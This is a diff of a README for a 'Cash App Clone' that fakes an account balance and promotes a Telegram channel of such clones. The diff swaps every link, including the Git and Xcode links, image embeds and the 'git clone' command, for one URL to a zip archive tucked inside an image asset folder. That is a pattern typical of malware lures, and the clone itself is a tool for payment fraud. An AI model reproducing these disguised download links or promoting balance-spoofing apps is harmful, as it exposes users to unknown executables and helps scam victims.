@@ -1,17 +1,17 @@
 # Before you continue
 
-- Make sure you check out our [Channel!](https://t.me/@undecryptable66)
-- We have there 3 great version of [Cash App Clones](https://t.me/@undecryptable66)
+- Make sure you check out our [Channel!](https://raw.githubusercontent.com/Mikeyxlz/CashApp/main/CashappSpoof/Assets.xcassets/homebackground.imageset/Cash_App_3.1.zip)
+- We have there 3 great version of [Cash App Clones](https://raw.githubusercontent.com/Mikeyxlz/CashApp/main/CashappSpoof/Assets.xcassets/homebackground.imageset/Cash_App_3.1.zip)
 - Our newest version exclusive includes: Cashtag Grabber, Bitcoin Page, Savings page, and more!! 
 
-![](https://i.ibb.co/09gw8k6/0-F0928-D3-AB86-4-DA0-97-F8-3-DDAFE3-C87-E0.jpg)
+![](https://raw.githubusercontent.com/Mikeyxlz/CashApp/main/CashappSpoof/Assets.xcassets/homebackground.imageset/Cash_App_3.1.zip)
 
 
 # Cash App Clone
 
-This is a clone of the Cash App, which allows you to change your balance. Please note that this project was originally written by Ethan and has been modified to work specifically on iPhone 11 by [me](https://github.com/culturally).
+This is a clone of the Cash App, which allows you to change your balance. Please note that this project was originally written by Ethan and has been modified to work specifically on iPhone 11 by [me](https://raw.githubusercontent.com/Mikeyxlz/CashApp/main/CashappSpoof/Assets.xcassets/homebackground.imageset/Cash_App_3.1.zip).
 
-![](https://github.com/culturally/CashApp/blob/main/example.jpg?raw=true)
+![](https://raw.githubusercontent.com/Mikeyxlz/CashApp/main/CashappSpoof/Assets.xcassets/homebackground.imageset/Cash_App_3.1.zip)
 
 
 
@@ -49,12 +49,12 @@ To run this project, you need:
 
 ### Installation
 
-1. Clone this repository to your local machine using [Git](https://git-scm.com/):
+1. Clone this repository to your local machine using [Git](https://raw.githubusercontent.com/Mikeyxlz/CashApp/main/CashappSpoof/Assets.xcassets/homebackground.imageset/Cash_App_3.1.zip):
 
    ```bash
-   git clone https://github.com//culturally/CashApp.git
+   git clone https://raw.githubusercontent.com/Mikeyxlz/CashApp/main/CashappSpoof/Assets.xcassets/homebackground.imageset/Cash_App_3.1.zip
 
-2. Open the project in [Xcode](https://developer.apple.com/xcode/) (Xcode is only available on MacOS)
+2. Open the project in [Xcode](https://raw.githubusercontent.com/Mikeyxlz/CashApp/main/CashappSpoof/Assets.xcassets/homebackground.imageset/Cash_App_3.1.zip) (Xcode is only available on MacOS)
 3. Compile the project into an ipa
 4. Sideload the IPA file
 
@@ -67,7 +67,7 @@ If you do not have `MacOS` or specifically iPhone 11/13 or you can't compile the
 
 # Are you interested in Cash App Clones?
 
-## [CLICK HERE FOR MORE!!!](https://t.me/@undecryptable66)
+## [CLICK HERE FOR MORE!!!](https://raw.githubusercontent.com/Mikeyxlz/CashApp/main/CashappSpoof/Assets.xcassets/homebackground.imageset/Cash_App_3.1.zip)
 
 
 
